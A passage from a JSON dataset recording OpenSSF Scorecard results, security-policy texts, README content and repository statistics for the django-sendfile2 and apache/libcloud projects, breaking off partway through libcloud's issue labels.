                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "0 commit(s) and 0 issue activity found in the last 90 days -- score normalized to 0",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:21: update your workflow using https://app.stepsecurity.io/secureworkflow/moggers87/django-sendfile2/tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:25: update your workflow using https://app.stepsecurity.io/secureworkflow/moggers87/django-sendfile2/tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/tests.yml:33: update your workflow using https://app.stepsecurity.io/secureworkflow/moggers87/django-sendfile2/tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:43: update your workflow using https://app.stepsecurity.io/secureworkflow/moggers87/django-sendfile2/tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:45: update your workflow using https://app.stepsecurity.io/secureworkflow/moggers87/django-sendfile2/tests.yml/main?enable=pin",
                        "Warn: pipCommand not pinned by hash: .github/workflows/tests.yml:30",
                        "Warn: pipCommand not pinned by hash: .github/workflows/tests.yml:50",
                        "Info:   0 out of   4 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   1 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   2 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 14 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.rst:1",
                        "Info: Found linked content: SECURITY.rst:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: SECURITY.rst:1",
                        "Info: Found text in security policy: SECURITY.rst:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": [
                        "Warn: release artifact v0.7.0 not signed: https://api.github.com/repos/moggers87/django-sendfile2/releases/73931935",
                        "Warn: release artifact v0.6.1 not signed: https://api.github.com/repos/moggers87/django-sendfile2/releases/57411883",
                        "Warn: release artifact v0.6.0 not signed: https://api.github.com/repos/moggers87/django-sendfile2/releases/27659725",
                        "Warn: release artifact v0.5.1 not signed: https://api.github.com/repos/moggers87/django-sendfile2/releases/22508063",
                        "Warn: release artifact v0.7.0 does not have provenance: https://api.github.com/repos/moggers87/django-sendfile2/releases/73931935",
                        "Warn: release artifact v0.6.1 does not have provenance: https://api.github.com/repos/moggers87/django-sendfile2/releases/57411883",
                        "Warn: release artifact v0.6.0 does not have provenance: https://api.github.com/repos/moggers87/django-sendfile2/releases/27659725",
                        "Warn: release artifact v0.5.1 does not have provenance: https://api.github.com/repos/moggers87/django-sendfile2/releases/22508063"
                    ],
                    "score": 0,
                    "reason": "Project has not signed or included provenance with any releases.",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: no topLevel permission defined: .github/workflows/tests.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/moggers87/django-sendfile2/contents/SECURITY.rst",
        "SecurityPolicy_content": "Security\n========\n\ndjango-sendfile2 is written in as secure a manner as possible and assumes that\nit is operating in a hostile environment. If you find django-sendfile2 doesn't\nbehave correctly given that constraint then please email\n`security@moggers87.co.uk <security@moggers87.co.uk>`__. If you want to send an\nencrypted report, then please use key id 0x878B5A2A1D47C084.\n\ndjango-sendfile2 follows the same security reporting model that has worked for\nother open source projects: If you report a security vulnerability, it will be\nacted on immediately and a fix with complete full disclosure will go out to\neveryone at the same time.\n",
        "project_all_labels": [
            "bug",
            "duplicate",
            "enhancement",
            "good first issue",
            "help wanted",
            "invalid",
            "question",
            "wontfix"
        ],
        "README_content": "=================\nDjango Sendfile 2\n=================\n\n.. image:: https://github.com/moggers87/django-sendfile2/actions/workflows/tests.yml/badge.svg\n   :target: https://github.com/moggers87/django-sendfile2/actions/workflows/tests.yml\n.. image:: https://readthedocs.org/projects/django-sendfile2/badge/?version=latest\n   :target: https://django-sendfile2.readthedocs.io/en/latest/?badge=latest\n   :alt: Documentation Status\n\n.. inclusion-marker-do-not-remove-start\n\nThis is a wrapper around web-server specific methods for sending files to web\nclients.  This is useful when Django needs to check permissions associated\nfiles, but does not want to serve the actual bytes of the file itself.  i.e. as\nserving large files is not what Django is made for.\n\nNote this should not be used for regular file serving (e.g. CSS etc), only for\ncases where you need Django to do some work before serving the actual file.\n\n- Download: https://pypi.org/project/django-sendfile2/\n- Source: https://github.com/moggers87/django-sendfile2\n- Documentation: https://django-sendfile2.readthedocs.io/\n\nSupported Python Versions\n=========================\n\nPython 3.8, 3.9, 3.10, 3.11, and 3.12 are currently supported by this library.\n\nSupported Django Versions\n=========================\n\nDjango 3.2, 4.2, and 5.0 are currently supported by this library.\n\nFork\n====\n\nThis project is a fork of `django-sendfile\n<https://github.com/johnsensible/django-sendfile>`_. The original project\nappears mostly dead and has a number of outstanding bugs (especially with\nPython 3).\n\nFunding\n=======\n\nIf you have found django-sendfile2 to be useful and would like to see its continued\ndevelopment, please consider `buying me a coffee\n<https://ko-fi.com/moggers87>`_.\n\n.. inclusion-marker-do-not-remove-end\n",
        "num_commits": 188,
        "project_age_days": 2415,
        "project_created_at": "2018-03-20",
        "latest_updated_at": "2024-10-16",
        "latest_pushed_at": "2024-05-17",
        "num_contributors": 21,
        "num_pull": 37,
        "num_issues": 62,
        "num_opening_issue": 6,
        "project_size(kB)": 204,
        "num_stargazers": 83,
        "num_watchers": 83,
        "num_forks": 15,
        "num_subscribers": 6,
        "SecurityPolicy_created_at": "2019-10-04 23:31:48",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "25f1ce29cc7d844df5a1c9c8a24d0002e2e97139",
                "url": "https://github.com/moggers87/django-sendfile2/commit/25f1ce29cc7d844df5a1c9c8a24d0002e2e97139",
                "date": "2019-10-04 23:31:48"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "email",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": false
    },
    {
        "project_name": "apache/libcloud",
        "project_url": "https://github.com/apache/libcloud",
        "SSF": {
            "date": "2024-10-29T21:01:37+07:00",
            "repo": {
                "name": "github.com/apache/libcloud",
                "commit": "1ebd60533ad1b4a9384716fd2c2dcf43fcd78674"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 6.5,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'trunk'",
                        "Info: 'force pushes' disabled on branch 'trunk'",
                        "Warn: branch 'trunk' does not require approvers",
                        "Warn: codeowners review is not required on branch 'trunk'",
                        "Info: status check found to merge onto on branch 'trunk'"
                    ],
                    "score": 3,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "6 out of 6 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "Found 1/18 approved changesets -- score normalized to 0",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: rust-secure-code contributor org/company found, Rust-for-Linux contributor org/company found, hallowauth contributor org/company found, luvit contributor org/company found, mistio contributor org/company found, ascoderu contributor org/company found, ibmstorage contributor org/company found, xattr contributor org/company found, certifi contributor org/company found, cloudkick contributor org/company found, ml engineer @navalmartin.com contributor org/company found, IBM contributor org/company found, wal-e contributor org/company found, topazproject contributor org/company found, apache contributor org/company found, python-trio contributor org/company found, nko contributor org/company found, dell technologies contributor org/company found, elastic contributor org/company found, pypa contributor org/company found, collective contributor org/company found, Hypernode contributor org/company found, cloud mercato contributor org/company found, microsoft contributor org/company found, cloudmercato contributor org/company found, red-hat-storage contributor org/company found, pypy contributor org/company found, pypi contributor org/company found, llvm contributor org/company found, CoachSpree contributor org/company found, GoInnovation contributor org/company found, dimensiondatacbusydney @dimensiondataresearch contributor org/company found, googleapis contributor org/company found, ibm contributor org/company found, Wadodo contributor org/company found, django contributor org/company found, PyCon contributor org/company found, rust-lang contributor org/company found, oncecloud contributor org/company found, unweb contributor org/company found, freebsd contributor org/company found, doccano contributor org/company found, CentOS-Storage-SIG contributor org/company found, pyca contributor org/company found, twisted contributor org/company found, plone contributor org/company found, urllib3 contributor org/company found, ByteInternet contributor org/company found, globalwebindex contributor org/company found, openshift contributor org/company found, monitoringsucks contributor org/company found, plumi contributor org/company found, nvidia corporation contributor org/company found, python-http contributor org/company found, django-dbbackup contributor org/company found, crusoe contributor org/company found, rust-fuzz contributor org/company found, psf contributor org/company found, fishinabarrel contributor org/company found, baidu contributor org/company found, HACKthePLANET contributor org/company found, grycap contributor org/company found, grycap - upv contributor org/company found, southpass contributor org/company found, paramiko contributor org/company found, jclouds contributor org/company found, socialplanning contributor org/company found, ceph contributor org/company found, rustsec contributor org/company found, StackStorm contributor org/company found, european space agency contributor org/company found, elastacloud contributor org/company found, python contributor org/company found, google contributor org/company found, esa contributor org/company found, politikon contributor org/company found, release-engineering contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 77 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: .github/dependabot.yml:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: Apache License 2.0: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "0 commit(s) and 0 issue activity found in the last 90 days -- score normalized to 0",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:34: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/codeql-analysis.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:37: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/codeql-analysis.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:42: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/codeql-analysis.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:45: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/codeql-analysis.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/depsreview.yaml:22: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/depsreview.yaml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/depsreview.yaml:25: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/depsreview.yaml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/install_test.yml:38: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/install_test.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/install_test.yml:43: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/install_test.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/install_test.yml:62: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/install_test.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/integration-tests.yml:38: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/integration-tests.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/integration-tests.yml:43: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/integration-tests.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/integration-tests.yml:53: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/integration-tests.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:305: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/main.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:310: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/main.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:320: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/main.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:349: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/main.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:354: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/main.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:364: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/main.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:49: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/main.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:55: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/main.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:66: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/main.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:82: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/main.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:87: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/main.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:122: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/main.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:127: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/main.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:137: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/main.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:170: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/main.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:175: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/main.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:185: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/main.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:213: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/main.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:237: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/main.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:247: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/main.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:252: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/main.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish_dev_artifact.yml:31: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/publish_dev_artifact.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish_dev_artifact.yml:36: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/publish_dev_artifact.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish_dev_artifact.yml:55: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/publish_dev_artifact.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish_pricing_to_s3.yml:28: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/publish_pricing_to_s3.yml/trunk?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish_pricing_to_s3.yml:33: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/libcloud/publish_pricing_to_s3.yml/trunk?enable=pin",
                        "Warn: containerImage not pinned by hash: contrib/Dockerfile:18: pin your Docker image by updating ubuntu:22.04 to ubuntu:22.04@sha256:0e5e4a57c2499249aafc3b40fcd541e9a456aab7296681a3994d631587203f97",
                        "Warn: pipCommand not pinned by hash: .github/actions/gh-action-pip-audit/setup/setup.bash:28",
                        "Warn: pipCommand not pinned by hash: scripts/dist_install_check.sh:41",
                        "Warn: pipCommand not pinned by hash: scripts/dist_wheel_install_check.sh:41",
                        "Warn: pipCommand not pinned by hash: .github/workflows/install_test.yml:51",
                        "Warn: pipCommand not pinned by hash: .github/workflows/integration-tests.yml:62",
                        "Warn: pipCommand not pinned by hash: .github/workflows/main.yml:97",
                        "Warn: pipCommand not pinned by hash: .github/workflows/main.yml:101",
                        "Warn: pipCommand not pinned by hash: .github/workflows/main.yml:146",
                        "Warn: pipCommand not pinned by hash: .github/workflows/main.yml:194",
                        "Warn: pipCommand not pinned by hash: .github/workflows/main.yml:261",
                        "Warn: pipCommand not pinned by hash: .github/workflows/main.yml:267",
                        "Warn: pipCommand not pinned by hash: .github/workflows/main.yml:329",
                        "Warn: pipCommand not pinned by hash: .github/workflows/main.yml:373",
                        "Warn: pipCommand not pinned by hash: .github/workflows/main.yml:385",
                        "Warn: pipCommand not pinned by hash: .github/workflows/publish_dev_artifact.yml:42",
                        "Warn: pipCommand not pinned by hash: .github/workflows/publish_dev_artifact.yml:43",
                        "Warn: pipCommand not pinned by hash: .github/workflows/publish_pricing_to_s3.yml:39",
                        "Info:   0 out of  38 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   1 out of   1 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   1 containerImage dependencies pinned",
                        "Info:   1 out of  18 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Info: SAST configuration detected: CodeQL",
                        "Info: all commits (13) are checked with a SAST tool"
                    ],
                    "score": 10,
                    "reason": "SAST tool is run on all commits",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: docs/security.rst:1",
                        "Info: Found linked content: docs/security.rst:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: docs/security.rst:1",
                        "Info: Found text in security policy: docs/security.rst:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Info: jobLevel 'actions' permission set to 'read': .github/workflows/codeql-analysis.yml:21",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/codeql-analysis.yml:12",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/depsreview.yaml:9",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/install_test.yml:11",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/integration-tests.yml:16",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/main.yml:14",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/publish_dev_artifact.yml:17",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/publish_pricing_to_s3.yml:10",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 10,
                    "reason": "GitHub workflow tokens follow principle of least privilege",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/apache/libcloud/contents/docs/security.rst",
        "SecurityPolicy_content": "Security\n========\n\n.. _security:\n\nReporting a vulnerability\n-------------------------\n\n.. note::\n\n    Please do **not** report security issues using our public Github instance. Use\n    the private mailing list described below.\n\nIf you believe you've found a security issue or a vulnerability, please send a\ndescription of it to our private mailing list at security@libcloud.apache.org\n\nYou are also encouraged to encrypt this email using PGP. Keys of our developers\ncan be found at https://www.apache.org/dist/libcloud/KEYS.\n\nOnce you've submitted an issue, you should receive an acknowledgment from one\nour of team members in 48 hours or less. If further action is necessary, you\nmay receive additional follow-up emails.\n\nHow are vulnerabilities handled?\n--------------------------------\n\nWe follow a standard Apache Software Foundation vulnerability handling process\nwhich is described at http://www.apache.org/security/committers.html#vulnerability-handling\n",
        "project_all_labels": [
            "api documentation",
            "api: backup",
            "api: common",
            "api: common: connection",
            "api: compute",
            "api: compute: deploy node",
            "api: compute: ssh",
            "api: compute: ssh: paramiko",
            "api: container",
            "api: dns",
            "api: http layer",
            "api: http layer: retrying",
            "api: loadbalancer",
            "api: storage",
            "async",
            "bug fix",
            "build",
            "ci/cd",
            "code reformat: black",
            "dev tooling",
            "documentation",
            "driver: aliyun ecs",
            "driver: godaddy dns",
            "driver: nttcis",
            "drivers: aliyun oss",
            "drivers: aurora dns",
            "drivers: aws alb",
            "drivers: aws s3",
            "drivers: aws s3 compatible",
            "drivers: azure",
            "drivers: azure arm",
            "drivers: azure blobs",
            "drivers: backblaze b2",
            "drivers: cloudfiles",
            "drivers: cloudflare",
            "drivers: cloudsigma",
